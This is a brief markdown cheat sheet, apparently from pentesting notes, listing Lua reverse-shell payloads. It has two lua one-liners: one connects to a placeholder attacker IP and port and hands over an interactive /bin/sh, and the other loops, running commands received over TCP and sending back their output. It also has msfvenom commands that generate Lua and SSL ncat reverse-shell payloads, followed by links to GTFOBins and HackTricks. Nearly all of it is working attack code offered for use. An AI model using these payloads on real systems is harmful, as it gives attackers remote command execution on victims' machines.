# Lua

## 01 - One-liners

First variant.

```lua
$ lua -e "require('socket');require('os');t=socket.tcp();t:connect('<IP>','<PORT>');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

Second variant.

```lua
$ lua5.1 -e 'local host, port = "<IP>", <PORT> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## 02 - Generate via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_lua lhost=<IP> lport=<PORT>

$ msfvenom -p cmd/unix/reverse_ncat_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

---
## References

### GTFOBins

- [GTFOBins: Lua](https://gtfobins.github.io/gtfobins/lua/)

- [GTFOBins: Nmap](https://gtfobins.github.io/gtfobins/nmap/)

- [GTFOBins: view](https://gtfobins.github.io/gtfobins/view/)

- [GTFOBins: rview](https://gtfobins.github.io/gtfobins/rview/)

- [GTFOBins: vim](https://gtfobins.github.io/gtfobins/vim/)

- [GTFOBins: vimdiff](https://gtfobins.github.io/gtfobins/vimdiff/)

- [GTFOBins: rvim](https://gtfobins.github.io/gtfobins/rvim/)

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)

### Github

- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)